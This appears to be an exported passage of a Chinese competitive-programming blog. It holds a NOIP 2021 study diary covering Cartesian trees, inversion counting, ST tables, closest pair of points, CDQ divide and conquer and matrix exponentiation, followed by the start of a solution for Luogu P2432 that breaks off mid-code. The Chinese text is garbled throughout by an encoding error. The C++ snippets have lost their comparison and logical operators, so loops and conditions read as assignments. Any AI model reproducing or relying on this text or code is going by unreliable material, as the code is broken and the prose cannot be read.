ä¸ªäººçš„æ—¶å€™ï¼Œå‰é¢é€‰ $i$ ä½ï¼Œåé¢é€‰ $k - i$ ä½ï¼Œç„¶è€ŒæŠ•â€œå¥½â€çš„äººä¸ç¡®å®šï¼Œæ‰€ä»¥è¦é€šè¿‡å¾ªç¯ç´¯åŠ ç­”æ¡ˆï¼Œæœ€åå–æœ€å°å€¼ã€‚æ—¶é—´å¤æ‚åº¦ä¸º $O(n^2)$ã€‚ $\\texttt{Day -12 2021.11.08}$ç»§ç»­è¡¥æ¨¡æ‹Ÿèµ›ï¼Œä½†å‘ç°è¿˜æ˜¯ä¸ä¼šqwqï¼Œé¢“äº†â€¦â€¦å¤ä¹ çŸ¥è¯†ç‚¹å»äº†ï¼è¢«åˆèµ›çš„æœ€åä¸€é¢˜æ¶å¿ƒåˆ°äº†ï¼Œå› æ­¤å­¦ä¹ ä¸€ä¸‹ç¬›å¡å°”æ ‘ã€‚ ç¬›å¡å°”æ ‘æ˜¯ä¸€ç§äºŒå‰æ ‘ï¼Œæ¯ä¸€ä¸ªç»“ç‚¹ç”±ä¸€ä¸ªé”®å€¼äºŒå…ƒç»„ $(k,w)$ æ„æˆã€‚è¦æ±‚ $k$ æ»¡è¶³äºŒå‰æœç´¢æ ‘çš„æ€§è´¨ï¼Œè€Œ $w$ æ»¡è¶³å †çš„æ€§è´¨ã€‚ç¬›å¡å°”æ ‘çš„ä¸­åºéå†ä¾¿æ˜¯åŸåºåˆ—ã€‚ ä¿è¯ $k_i$ é€’å¢ï¼Œä»ä¸‹å¾€ä¸Šæ¯”è¾ƒå³é“¾ç»“ç‚¹ä¸å½“å‰ç»“ç‚¹ $u$ çš„ $w$ï¼Œå¦‚æœæ‰¾åˆ°äº†ä¸€ä¸ªå³é“¾ä¸Šçš„ç»“ç‚¹ $x$ æ»¡è¶³ $x_w u_w$ï¼Œå°±æŠŠ $u$ æ¥åˆ° $x$ çš„å³å„¿å­ä¸Šï¼Œè€Œ åŸæœ¬ $x$ çš„å³å­æ ‘å°±å˜æˆ $u$ çš„å·¦å­æ ‘ã€‚æ¯ä¸ªæ•°æœ€å¤šè¿›å‡ºå³é“¾ä¸€æ¬¡ï¼Œå¯ä»¥ç”¨å•è°ƒæ ˆç»´æŠ¤ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º $O(n)$ã€‚ä¸‹é¢æ”¾ä¸ªæ ¸å¿ƒä»£ç ï¼š //k è®°å½•å½“å‰çš„æ ˆé¡¶ï¼›top è®°å½•ä¸Šä¸€æ¬¡çš„æ ˆé¡¶for (int i = 1;i = n;++i) k = top; while (k root[i] root[s[k]]) --k; if (k) rc[s[k]] = i; if (k top) lc[i] = s[k + 1]; s[++k] = i; top = k; $\\texttt{Day -11 2021.11.09}$åˆ†æ²»ç®—æ³•ä¸“é¢˜ é€†åºå¯¹ ç”¨å½’å¹¶æ’åºæ¨¡æ‹Ÿè¿‡ç¨‹ã€‚å‡è®¾å°†æœ‰åºæ•°ç»„ $A,B$ åˆæˆ $C$ï¼Œå…ƒç´ ä¸ªæ•°åˆ†åˆ«ä¸º $sz_a,sz_b$ï¼ŒæŒ‡é’ˆä¸º $p_a,p_b$ã€‚åˆ™å½“ $A[p_a] B[p_b]$ æ—¶ï¼Œ$A$ ä¸­ $p_a$ ä¹‹åçš„æ‰€æœ‰å…ƒç´ ä¸ $B[p_b]$ å½¢æˆé€†åºå¯¹ï¼Œæ‰€ä»¥ç­”æ¡ˆç´¯åŠ  $sz_b - p_a + 1$ã€‚ ç”±äºä½¿ç”¨å½’å¹¶æ’åºåˆ†æ²»æ±‚è§£ï¼Œæ‰€ä»¥æ—¶é—´å¤æ‚åº¦ä¸º $O(n \\log n)$ã€‚å½“ç„¶ç”¨æ ‘çŠ¶æ•°ç»„çš„æ—¶é—´å¤æ‚åº¦ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚æ ¸å¿ƒä»£ç æ”¾ä¸€ä¸ªå§ï¼ while (p1 = mid || p2 = r) if (p1 = mid (p2 r || a[p1] = a[p2])) b[++p] = a[p1]; ++p1; else b[++p] = a[p2]; ++p2; ans += mid - p1 + 1; ST è¡¨ ç”¨ $f_{i,j}$ è¡¨ç¤ºä»¥ $i$ ä¸ºèµ·ç‚¹ï¼ŒåŒºé—´é•¿åº¦ä¸º $2^j$ çš„æœ€å€¼ã€‚æ˜¾ç„¶åˆå§‹åŒ–ä¸º $f_{i,0} = a_i$ï¼Œè½¬ç§»æ–¹ç¨‹ä¸ºï¼ˆä»¥æœ€å°å€¼ä¸ºä¾‹ï¼‰ï¼š$f_{i,j} = \\min (f_{i,j - 1},f_{i + 2^{j - 1} + 1,j - 1})$ã€‚ åœ¨æŸ¥è¯¢åŒºé—´æ—¶ï¼Œè®¾åŒºé—´é•¿åº¦ä¸º $k$ï¼Œåˆ™éœ€è¦æ‰¾å‡ºæœ€å¤§çš„ $p$ æ»¡è¶³ $2^p \\le k$ï¼Œä¹Ÿå°±æ˜¯ $\\min (f_{l,p},f_{r - (1 k) + 1,p})$ã€‚æ—¶é—´å¤æ‚åº¦ä¾æ—§æ˜¯ $O(n \\log n)$ã€‚ å¹³é¢æœ€è¿‘ç‚¹å¯¹ æœ€ç®€å•çš„åšæ³•æ˜¯æš´åŠ›æšä¸¾ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º $O(n^2)$ã€‚ä½†æ˜¯æœ‰æ›´ä¼˜è§£æ³•ï¼Œç°åœ¨è€ƒè™‘åˆ†æ²»ã€‚ é¦–å…ˆå°†æ‰€æœ‰ç‚¹æŒ‰ç…§ $x$ åæ ‡æ’åºï¼Œå¹¶åˆ†æˆå·¦å³ä¸¤ä¾§ã€‚åˆ©ç”¨é€’å½’æ±‚è§£å·¦å³ä¸¤ä¾§çš„æœ€ä¼˜ç­”æ¡ˆï¼Œè®¾ä¸º $(p_1,p_2)$ å’Œ $(q_1,q_2)$ã€‚åœ¨åˆå¹¶ç­”æ¡ˆçš„æ—¶å€™ï¼Œå¯èƒ½ç­”æ¡ˆåœ¨å·²ç»è¢«è®¡ç®—å®Œæˆçš„åŒä¾§ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸¤ä¾§ã€‚ è®¾ $d = \\min (dis(p_1,p_2),dis(q_1,q_2))$ï¼Œæ˜¾ç„¶æœ€ä¼˜è§£åˆ†å¸ƒäºä¸­è½´çº¿ä¸¤ä¾§æ—¶ï¼Œè·ç¦»å°äº $d$ã€‚å›ºå®šä¸€ä¾§çš„ä¸€ä¸ªç‚¹ $p$ï¼Œåˆ™åªéœ€å†æ¡†å‡ºå¦ä¸€ä¾§çš„ $d \\times 2d$ çš„åŒºåŸŸçš„ç‚¹è¿›è¡Œç­”æ¡ˆçš„æ›´æ–°å³å¯ï¼ˆç”±æ•°å­¦ä¸­çš„é¹Šå·¢åŸç†çŸ¥æœ€å¤šæœ‰ $6$ ä¸ªç‚¹åœ¨è¯¥åŒºåŸŸä¸­ï¼‰ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬å°†ç‚¹å†æŒ‰ç…§ $y$ åæ ‡æ’åºï¼Œç”±äºæ‰€æ¡†çš„åŒºåŸŸå•è°ƒé€’å¢ï¼Œæ‰€ä»¥å¤æ‚åº¦ä¸º $O(n)$ï¼Œæ€»å¤æ‚åº¦ä¸º $O(n \\log ^2 n)$ã€‚å½“ç„¶ï¼Œå…¶ä¸­çš„æ’åºå¯ä»¥ç”¨å½’å¹¶æ’åºæ¥ä»£æ›¿ï¼Œåœ¨è¿›è¡Œåˆå¹¶æ—¶ï¼ŒåŒæ—¶è¿›è¡ŒæŒ‰ç…§ $y$ åæ ‡çš„æ’åºï¼Œè¿™æ ·åŸæ¥ç”¨ sort æ’åºçš„æ—¶é—´å¤æ‚åº¦å°±è¢«çœå»ï¼Œæ€»å¤æ‚åº¦é™ä¸º $O(n \\log n)$ã€‚ æ”¾ä¸ªä¸»è¦ä»£ç ï¼š double search (int l,int r) if (l == r) return INF; int mid = (l + r) 1; double md = p[mid].x,d = min (search (l,mid),search (mid + 1,r));//é€’å½’æ±‚è§£å·¦å³ä¸¤ä¾§çš„æœ€ä¼˜è§£ int p1 = l,p2 = mid + 1,cnt = 0; while (p1 = mid || p2 = r)//æŒ‰ç…§ y è½´è¿›è¡Œå½’å¹¶æ’åº if (p1 = mid (p2 r || p[p1].y p[p2].y)) q[++cnt] = p[p1++]; else q[++cnt] = p[p2++]; for (int i = 1;i = cnt;++i) p[l + i - 1] = q[i]; cnt = 0; for (int i = l;i = r;++i) if (abs(p[i].x - md) = d) q[++cnt] = p[i];//æ¨ªåæ ‡åœ¨ d èŒƒå›´å†… for (int i = 1;i = cnt;++i) for (int j = i - 1;j = 1 q[i].y - q[j].y = d;--j) d = min (d,dis (q[i],q[j]));//çºµåæ ‡åœ¨ d èŒƒå›´å†… for (int j = i + 1;j = cnt q[j].y - q[i].y = d;++j) d = min (d,dis (q[i],q[j])); return d; ã€å’³å’³ï¼Œè¯è¯´æˆ‘ç«Ÿç„¶è¢«åŠ å¼ºåŠ å¼ºç‰ˆçš„ç²¾åº¦å¡äº†å¥½ä¹…ï¼Œæ²¡æƒ³åˆ°æœ€åæ”¹æˆ printf (%0.0lf ,ans * ans); å°±è¿‡äº†ï¼Œå“­â€¦ã€‘ $\\texttt{cdq}$ åˆ†æ²» è¿™ä¸€ç±»é—®é¢˜çš„ç‰¹ç‚¹åœ¨äºåˆ†æ²»åˆ’åˆ†å‡ºæ¥çš„ä¸¤ä¸ªå­é—®é¢˜å‰åå…·æœ‰ä¸€å®šçš„å½±å“ã€‚ ç”±äºŒç»´ååºå¼•å…¥ï¼Œ$n$ ä¸ªæœ‰åºå¯¹ $(a_i,b_i)$ï¼Œæ±‚å¯¹äºæ¯ä¸€ä¸ª $(a_i,b_i)$ï¼Œæ»¡è¶³ $a_i a_j$ ä¸” $b_i b_j$ çš„æœ‰åºå¯¹ $(a_j,b_j)$ çš„ä¸ªæ•°ã€‚è¯¥é—®é¢˜çš„è§£æ³•å°±ç›¸å½“äºå½’å¹¶æ’åºæ±‚é¡ºåºå¯¹ã€‚åœ¨æ’åºè¿‡ç¨‹ä¸­ï¼Œå¯ä»¥ä»¤ $a_i$ ä»£è¡¨åœ¨æ•°ç»„ä¸­çš„ä½ç½®ï¼Œ$b_i$ ä»£è¡¨å€¼ï¼Œå› æ­¤å°† $a_i$ æ’åºä¹‹åå°±èƒ½å¿½ç•¥å…¶å½±å“ã€‚æ—¶é—´å¤æ‚åº¦ä¸º $O(n \\log n)$ã€‚ è€Œå¯¹äºä¸‰ç»´ååºé—®é¢˜ï¼Œç»™å®š $n$ ä¸ªæœ‰åºå¯¹ $(a,b,c)$ï¼Œæ±‚å¯¹äºæ¯ä¸ª $(a,b c)$ï¼Œæ»¡è¶³ $a_1a,b_1b,c_1c$ çš„æœ‰åºå¯¹ $(a_1,b_1,c_1)$ æœ‰å¤šå°‘ä¸ªã€‚è€ƒè™‘å°† $a$ æ’åºï¼Œç„¶å $b$ ç”¨å½’å¹¶æ’åºï¼Œå› æ­¤ç°åœ¨åªéœ€å†è€ƒè™‘ $c$ çš„å¤§å°ã€‚ æ¬²æ±‚ $[l,p_1)$ ä¸Š $c_i c_{p_2}$ çš„ä¸ªæ•°ï¼Œå¯ä»¥ç”¨æ•°æ®ç»“æ„ï¼ˆå¦‚æ ‘çŠ¶æ•°ç»„ï¼‰ç»´æŠ¤ $c$ çš„å€¼ã€‚å½“é€‰æ‹© $p_1$ æ—¶ï¼ŒåŠ å…¥ $c_{p_1}$ çš„å€¼ï¼Œå½“é€‰æ‹© $p_2$ æ—¶ï¼Œç›´æ¥æŸ¥è¯¢æ•°æ®ç»“æ„ä¸­å°äº $c_{p_2}$ çš„æ•°é‡ã€‚æ³¨æ„åˆå¹¶åæ•°æ®ç»“æ„çš„æ¸…ç©ºï¼Œéœ€è¦å€’åºåˆ é™¤ï¼ˆè‹¥ä½¿ç”¨æ ‘çŠ¶æ•°ç»„ï¼Œåˆ™éœ€è¦å°† $[l,mid]$ çš„æ‰€æœ‰ $c_i$ å‡ $-1$ï¼‰ï¼Œå¦åˆ™ç»´æŠ¤çš„æ—¶é—´å¤æ‚åº¦ä¼šé€€åŒ–ä¸º $O(n)$ã€‚å› ä¸ºä½¿ç”¨äº†æ—¶é—´å¤æ‚åº¦ä¸º $O(\\log n)$ çš„æ•°æ®ç»“æ„ï¼Œå†åŠ ä¸Šä¹‹å‰äºŒç»´ååºçš„æ—¶é—´å¤æ‚åº¦ï¼Œå› æ­¤æ€»æ—¶é—´å¤æ‚åº¦å˜ä¸º $O(n \\log^2 n)$ã€‚ äºæ˜¯æ•²äº†é“æ¨¡æ¿é¢˜ã€æ¨¡æ¿ã€‘ä¸‰ç»´ååºï¼ˆé™Œä¸ŠèŠ±å¼€ï¼‰ï¼Œæ”¾ä¸ªæ ¸å¿ƒä»£ç ï¼š int main () n = read ();k = read (); for (int i = 1;i = n;++i) p[i].x = read (),p[i].y = read (),p[i].z = read (); sort (p + 1,p + 1 + n,cmp); for (int i = 1;i = n;++i)//å»é‡ if (p[i].x != p[cnt].x || p[i].y != p[cnt].y || p[i].z != p[cnt].z) p[++cnt] = p[i]; ++tot[cnt]; for (int i = 1;i = cnt;++i) p[i].id = i; work (1,cnt); for (int i = 1;i = cnt;++i) ans[num[i] + tot[i] - 1] += tot[i]; for (int i = 0;i n;++i) printf (%d ,ans[i]); return 0;void work (int l,int r) if (l == r) return ; int mid = (l + r) 1,p1 = l,p2 = mid + 1,t = 0; work (l,mid);work (mid + 1,r); while (p1 = mid || p2 = r) if (p1 = mid (p2 r || p[p1].y = p[p2].y)) q[++t] = p[p1]; modify (p[p1].z,tot[p[p1].id]);++p1; else q[++t] = p[p2]; num[p[p2].id] += query (p[p2].z);++p2; for (int i = l;i = mid;++i) modify (p[i].z,-tot[p[i].id]); for (int i = 1;i = t;++i) p[l + i - 1] = q[i]; $\\texttt{Day -7 2021.11.13}$å‰å‡ å¤©ä¸€ç›´åœ¨å­¦ä¹ åˆ†æ²»ï¼Œä»Šå¤©åˆæ˜¯å‘¨æœ«ï¼Œæ‰€ä»¥åˆæ˜¯æ¨¡æ‹Ÿèµ›ã€‚ä»Šå¤©çš„é¢˜ç›®æ„Ÿè§‰æ¯”ä¸Šæ¬¡è¿˜éš¾ï¼Œå…¶ä¸­ $\\texttt{T2}$ æ•°æ®ä¼¼ä¹é”…äº†ï¼Œæ‰€ä»¥ç›®å‰çš„æˆç»©æ˜¯ï¼š$100 + ? + 0 + 0$ã€‚æ‹¿åˆ°é¢˜è§£å‘ç°é‚£é¢˜å’Œé¢˜è§£çš„æ€è·¯ä¸€æ ·ï¼Œä¼°è®¡æ•°æ®æ”¹äº†èƒ½è¿‡ï¼Œå¤§æ¦‚ $200$ åˆ†çš„æ ·å­ã€‚ $\\texttt{T1}$ $5$ åˆ†é’Ÿæ•²å®Œ $O(n^2)$ æš´åŠ›ï¼Œå‘ç°ç«Ÿç„¶å¯ä»¥æ‹¿åˆ° $60pts$ï¼Œå°è¯•å»ä¼˜åŒ–ç®—æ³•ï¼Œä½†æ˜¯æƒ³äº†å¥½ä¹…éƒ½æ— æ³•é™ä½å¤æ‚åº¦ã€‚è¿™æ—¶å€™å»çœ‹äº†ä¸€çœ¼æ•°æ®èŒƒå›´ï¼Œå‘ç° $a_i,b_i$ éƒ½ä¸ºéè´Ÿæ•´æ•°ä¸” $\\sum a_i,\\sum b_i \\le 5000$ï¼Œè€Œ $n$ åˆå·¨å¤§ï¼Œæ˜¾ç„¶æ•°æ®ä¸­æœ€å¤šå‡ºç° $5000$ ä¸ªéé›¶æ•°ã€‚é‚£ä¹ˆåªè¦å°†éé›¶æ•°å•ç‹¬æŒ‘å‡ºæ¥ï¼Œæ³¨æ„è®°å½•åŸä¸‹æ ‡ï¼Œè¿™ä¸‹å¾ªç¯æš´åŠ›ä¹Ÿèƒ½è§£å†³äº†ã€‚æ—¶é—´å¤æ‚åº¦ $O(n + 5000^2)$ã€‚ $\\texttt{T2}$ ä¸€çœ‹æ•°æ®èŒƒå›´å°±çŒœæµ‹æ˜¯ $O(n)$ çš„è´ªå¿ƒï¼Œé¢˜ç›®å¾ˆæ°´ï¼Œç±»ä¼¼æ±‚æœ€å¤§è¿ç»­å’Œçš„å¤„ç†ï¼Œé‡åˆ° B å°± ++cntï¼Œé‡åˆ° A å°± cnt = max (cnt - 1,0)ï¼Œå½“ç„¶ï¼Œè‹¥å‡ºç°éœ€è¦å°† A è¯¥ä¸º B æ—¶ï¼Œå°±ç›¸å½“äº cnt = max (cnt - 2,0)ã€‚ç”±äºè¦æ±‚æœ€å€¼ï¼Œæ‰€ä»¥å°½é‡ä¿®æ”¹é å·¦ä¾§çš„ã€‚å¦‚æœä» $1$ å¼€å§‹å¾ªç¯ä¼šå‡ºé”™ï¼Œç¨ä½œæ”¹å˜å€’åºå¾ªç¯å°±èƒ½å®Œç¾è§£å†³ã€‚å¯¹äº $2^i$ çš„å¤„ç†ï¼Œä¸€å¼€å§‹ç”¨äº†å¿«é€Ÿå¹‚ï¼Œåæ¥å‘ç°åªéœ€è¦ $O(n)$ çš„é¢„å¤„ç†å°±è¡Œäº†ã€‚å› æ­¤æ€»å¤æ‚åº¦ä»ç„¶æ˜¯ $O(n)$ çš„ï¼Œä¸ªäººæ„Ÿè§‰è¿™é“é¢˜æ¯” $\\texttt{T1}$ ç®€å•å¥½å¤šï¼Œæ¯•ç«Ÿæ˜¯ä¸€çœ¼é¢˜ã€‚ $\\texttt{T3}$ åªä¼šæ‰“ $O(nq)$ çš„å¤§æš´åŠ›ï¼Œè™½ç„¶æ—¶é™ $3s$ï¼Œä½†è¿˜æ˜¯å…¨éƒ¨è¶…æ—¶äº†ã€‚$\\texttt{T4}$ å®Œå…¨ä¸ä¼šã€‚ èµ›åçœ‹äº†é¢˜è§£ï¼Œåä¸¤é¢˜è¿˜æ˜¯ä¸å¤ªä¼šï¼Œå¯èƒ½åªèƒ½å…ˆæ”¾ç€äº† qwqã€‚ $\\texttt{Day -5 2021.11.15}$ æ‰“äº†è€ƒå‰æœ€åä¸€æ¬¡çš„æ¨¡æ‹Ÿèµ›ï¼Œç„¶è€Œä¸€å¼€å§‹å°±æƒ³å¤æ‚ã€‚æ˜æ˜å¯ä»¥æœ‰å¾ˆå¥½äº›çš„ $O(n)$ ä¼˜å…ˆé˜Ÿåˆ—ï¼Œç¡¬æ˜¯è¢«æ‰“æˆäº† $4KB+$ çš„ $O(n \\log n)$ çš„çº¿æ®µæ ‘ï¼Œè¿˜æ²¡è¿‡å¤§æ ·ä¾‹ï¼Œäºæ˜¯ä¹æœæ–­èµ°äººâ€¦â€¦ é€‰æ‹©æ‰“æ¨¡æ‹Ÿèµ›çœŸæ˜¯ä¸ªé”™è¯¯ã€‚ $\\texttt{Day -3 2021.11.17}$ å†å¤ä¹ ç‚¹ä»€ä¹ˆå§â€¦â€¦ çŸ©é˜µä¹˜æ³• $C_{i,j} = \\sum_{k = 1}^{M} A_{i,k} \\times B_{k,j}$ æ„é€ å•ä½çŸ©é˜µæ˜¯ä¼˜åŒ–ä¸­æœ€é‡è¦çš„éƒ¨åˆ†ï¼Œä»¥æ–æ³¢é‚£å¥‘æ•°åˆ—ä¸ºä¾‹ï¼Œç”±äº $f_i = f_{i - 1} + f_{i - 2},f_{i - 1} = f_{i - 1}$ï¼Œæ‰€ä»¥å•ä½çŸ©é˜µä¸º $\\left[ \\begin{array}{ccc} 11\\ 01\\ \\end{array} \\right]$ã€‚ä¸€å¼€å§‹çš„å‰ä¸¤é¡¹ä¸º$1,1$ï¼Œæ‰€ä»¥ $f_{n \\mid n 3} = \\left[1 1\\right] \\times \\left[ \\begin{array}{ccc} 11\\ 01\\ \\end{array} \\right]^{n - 2}$ã€‚è¿˜æœ‰ä¸€ä¸ªå•ä½çŸ©é˜µ $I$ æ»¡è¶³ $A \\times I = I \\times A = A$ï¼Œåˆ™ $I = \\left[ \\begin{array}{ccc} 10\\ 01\\ \\end{array} \\right]$ã€‚ åšäº†é“P1707 åˆ·é¢˜æ¯”èµ›ï¼Œç„¶å $11 \\times 11$ çŸ©é˜µè°ƒäº†ä¸€ä¸‡å¹´ã€‚ä¸€å¼€å§‹è¿‡ä¸äº†æ ·ä¾‹ï¼Œæœ€åå‘ç°çŸ©é˜µå°‘æ‰“äº†ä¸€ä¸ª $1$ï¼Œç„¶ååˆå› ä¸ºå–æ¨¡ $\\texttt{WA}$ äº†å¥½å‡ å‘ï¼Œæœ€åæ”¹æˆé¾Ÿé€Ÿä¹˜æ‰è¿‡ã€‚ å•è°ƒé˜Ÿåˆ— æ¯ä¸ªå…ƒç´ æœ€å¤šè¿›é˜Ÿä¸€æ¬¡ï¼Œå‡ºé˜Ÿä¸€æ¬¡ï¼Œå› æ­¤æ—¶é—´å¤æ‚åº¦ä¸º $O(n)$ã€‚ è¿˜æ˜¯åšäº†ä¸€é¢˜P2254 [NOI2005] ç‘°ä¸½åå°”å…¹ã€‚è®¾ $dp_{i,j}$ è¡¨ç¤ºæ»‘è¡Œåˆ° $(i,j)$ æ—¶çš„æœ€é•¿è·ç¦»ã€‚è€Œåœ¨æ»‘è¡Œä¸­å› æ¯æ¬¡åªå‘ä¸€ä¸ªæ–¹å‘æ»‘åŠ¨ï¼Œå› æ­¤å¯ä»¥è®°å½•å¼€å§‹ç§»åŠ¨æ—¶ä¸å½“å‰çš„ç›¸å¯¹ä½ç½®ï¼Œå¹¶ç”¨å•è°ƒé˜Ÿåˆ—ç»´æŠ¤æœ€å¤§å€¼ã€‚å½“ç„¶ï¼Œæ»‘åŠ¨éœ€è¦ä¸ç¢°åˆ°å®¶å…·ï¼Œåˆ™åœ¨ç¢°åˆ°æ—¶æ¸…ç©ºå•è°ƒé˜Ÿåˆ—å³å¯ã€‚è¿™æ ·æ—¶é—´å¤æ‚åº¦å°±é™åˆ°äº† $O(kmn)$ã€‚ $\\texttt{Day -2 2021.11.18}$å¤ä¹ æ•°å­¦ï¼Œçœ‹äº†ä¹‹å‰çš„å­¦ä¹ ç¬”è®°ã€‚ æ•²äº†ä¸€ä¸‹çº¿æ€§ç­›ï¼Œ$\\texttt{exgcd}$ï¼Œä¹˜æ³•é€†å…ƒå’Œæ¬§æ‹‰å‡½æ•°çš„æ¨¡æ¿ã€‚ $\\texttt{Day -1 2021.11.19}$å…ˆå¤ä¹ äº†å›¾è®ºçš„éƒ¨åˆ†å†…å®¹ï¼Œæ•²äº†ä¸ªæ±‚å‰²ç‚¹ä»¥åŠæœ€è¿‘å…¬å…±ç¥–å…ˆçš„æ¨¡æ¿ã€‚ç„¶åçœ‹äº†ä¸€äº› $\\texttt{STL}$ å…³é”®å­—çš„æ‹¼å†™åŠ set çš„ç”¨æ³•ã€‚ å¤§æ¦‚ $19:30$ ç¦»å¼€äº†æœºæˆ¿ã€‚ ç¥æ„¿ $\\texttt{rp++}$å§ï¼ $\\texttt{Day 0 2021.11.20}$$7:00$ èµ·åºŠå‰å¾€æ­å¸ˆå¤§ä»“å‰æ ¡åŒºã€‚ $8:00$ å°±åˆ°äº†ï¼Œè¿›å»é™åäº†å°†è¿‘åŠå°æ—¶ã€‚ å¼€èµ›åå¿«é€Ÿçœ‹äº†é¢˜ï¼Œç„¶åæ„Ÿè§‰ $\\texttt{T1}$ æ¯”è¾ƒå¥½å†™ï¼Œå’Œçº¿æ€§ç­›å·®ä¸å¤šã€‚å†™äº†ä¸€éå‘ç°ä¼¼ä¹æœ‰ç‚¹é—®é¢˜ï¼Œç­›ä¸å‡º $14$ã€‚ç„¶åå°è¯•äº†ä¸€ä¸‹åŸƒç­›ï¼Œæœ¬ä»¥ä¸ºä¼šè¶…æ—¶ï¼Œä½†æ˜¯è·‘äº†ä¸€ä¸‹å¤§æ ·ä¾‹å‘ç°åªè¦ä¸åˆ° $0.5s$ï¼Œæ£€æŸ¥äº†ä¸€ä¸‹ï¼Œå‘ç°äº†ä¸€ä¸ªè¾¹ç•Œçš„å°é”™è¯¯ï¼Œå…¶å®ƒæ— è¯¯åå°±çœ‹äº†ä¸‹ä¸€é¢˜ã€‚ è‡³æ­¤å¼€å§‹ï¼Œæ•´ä¸ªäººä¸€ç›´é™ä¸ä¸‹å¿ƒæ¥ï¼Œè¿™ä¹Ÿå°±æ˜¯æœ¬åœºæ¯”èµ›å¯¼è‡´å¤±è´¥çš„é‡è¦åŸå› ã€‚ $\\texttt{T2}$ çœ‹äº†å¾ˆä¹…éƒ½æ¯«æ— æ€è·¯ï¼Œè¿ $\\texttt{dp}$ éƒ½æ²¡æœ‰çœ‹å‡ºæ¥ã€‚æœ€åè¿æ³¨é‡Šéƒ½æ²¡åˆ æœ‰è¯´æ˜äº†åœ¨è€ƒåœºæ—¶çš„æµ®èºã€‚ $\\texttt{T3}$ å†™äº†ä¸€ä¸ªæš´åŠ›ï¼Œä½†æ˜¯æˆ‘åœ¨ä¿®æ”¹å¤šæ¬¡åç«Ÿæ²¡å‘ç°å¼€äº† 1e8 çš„æ•°ç»„ï¼Œäºæ˜¯ä¹åˆæ²¡äº†ã€‚ $\\texttt{T4}$ æ²¡è°ƒå®Œï¼Œä½†æ˜¯ä¾æ—§çŠ¯äº†ä¸€ä¸ªè‡´å‘½çš„é”™è¯¯ï¼Œå°±æ˜¯èµ·ç‚¹å¿˜è®°åŠ å…¥åˆ°é˜Ÿåˆ—å½“ä¸­ã€‚ æœ€åæ´›è°·è‡ªæµ‹ $100 + 0 + 0 + 0 = 100 \\texttt{ pts}$ï¼Œæ²¡æƒ³åˆ°è¿æš´åŠ›éƒ½æŒ‚ï¼Œå¿ƒæƒ…ä¸ä½³ï¼Œæ€•ä¼šå½±å“åˆ° whkï¼Œå°±æš‚æ—¶é€€å½¹äº†â€¦â€¦ åè®°$\\texttt{2021 NOIP}$ ç»“æŸäº†ï¼Œæ¥ä¸‹å»åˆæ˜¯ä¸€å¹´çš„æ¼«é•¿è®­ç»ƒã€‚ä¸€å®šè¦å¸å–æ•™è®­ï¼Œå¤šå¤šç»ƒä¹  $\\texttt{dp}$ï¼Œä»¥å‡å°‘è€ƒè¯•æ—¶å€™çš„ç´§å¼ æ„Ÿã€‚åŠ æ²¹å§ï¼","categories":["Journal"]},{"title":"é¢˜è§£ï¼šP2432 zxbsmkçˆ±æŸ¥é”™","path":"/2021/10/31/P2432/","content":"è€ƒè™‘åŠ¨æ€è§„åˆ’çš„ä½œæ³•ï¼Œè®¾ $dp[i]$ è¡¨ç¤ºåŸå­—ç¬¦ä¸²çš„å‰ $i$ ä½æœ€å°‘éœ€è¦åˆ é™¤çš„å­—ç¬¦çš„æ•°é‡ï¼Œæ˜¾ç„¶æœ€åçš„ç­”æ¡ˆæ˜¯ $dp[L]$ã€‚ å¯¹äºåˆå§‹å€¼ï¼Œå› ä¸ºæ±‚æœ€å°å€¼ï¼Œæ‰€ä»¥å…ˆæŠŠ $dp[i]$ å‡è®¾ç½®ä¸º $+\\infty$ï¼ŒåŒæ—¶ç”±è½¬ç§»æ–¹ç¨‹çš„å«ä¹‰å¯çŸ¥ $dp[0] = 0$ã€‚ç„¶åå°±æ˜¯å¤„ç†å•è¯ä¸æ–‡ç« æ˜¯å¦èƒ½åŒ¹é…çš„æ ¸å¿ƒæ€è·¯äº†ï¼Œè®¾ $dx$ è¡¨ç¤ºå½“å‰åŒ¹é…åˆ°çš„ä½ç½® $i$ï¼Œ$dy$ è¡¨ç¤ºç¬¬ $j$ ä¸ªå•è¯çš„é•¿åº¦ $len[j]$ã€‚ä» $i$ ä¸å•è¯çš„æœ«å°¾å¼€å§‹ï¼Œè‹¥æˆåŠŸåŒ¹é…ï¼Œåˆ™ $dx,dy$ å‡å‡ä¸€ï¼Œå¦åˆ™ $dx$ å‡ä¸€ã€‚å¦‚æœ $dy$ çš„å€¼å…ˆå˜ä¸º $0$ æˆ–è€… $dx,dy$ åŒæ—¶å˜ä¸º $0$ï¼Œè¿™è¯´æ˜è¯¥å•è¯èƒ½å¤Ÿåœ¨åŸå­—ç¬¦ä¸²ä¸­åŒ¹é…ï¼›ä½†æ˜¯å¦‚æœä¸èƒ½åŒ¹é…ï¼Œæ˜¾ç„¶åŸå­—ç¬¦ä¸²çš„ç¬¬ $i$ ä¸ªä½ç½®éœ€è¦è¢«åˆ é™¤ã€‚ æ‰€ä»¥æœ‰çŠ¶æ€è½¬ç§»æ–¹ç¨‹ $dp[i] = \\min (dp[i - 1] + 1,dp[dx] + (i - dx - len[j])$ï¼Œæ˜¾ç„¶æ­¤æ—¶çš„ $dx$ è¡¨ç¤ºåœ¨åŒ¹é…ä¹‹å $dx$ çš„å€¼ï¼Œè€Œä¸æ˜¯åˆå§‹çš„ $dx = i$ã€‚ è®²äº†è¿™ä¹ˆå¤šï¼Œå†çœ‹ç€ä»£ç ç†è§£ä¸€ä¸‹å­ï¼ #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,INF,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 605;const int MOD = 1e9 + 7;inline int read ();int n,m,dlen[MAX],dp[MAX];char str[MAX 1],cor[MAX][30]; int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read (); scanf (%s,str + 1); for (int i = 1;i = n;++i) scanf (%s,cor[i] + 1); dlen[i] = strlen (cor[i] + 1);//å•è¯çš„é•¿åº¦ init (dp);//åˆå§‹åŒ– dp[0] = 0; for (int i = 1;i = m;++i) dp[i] = dp[i - 1] + 1; for (int j = 1;j = n;++j)//å…±æœ‰ n ä¸ªå•è¯ï¼Œä¸€ä¸€åŒ¹é… int dx = i,dy = dlen[j]; while (dx 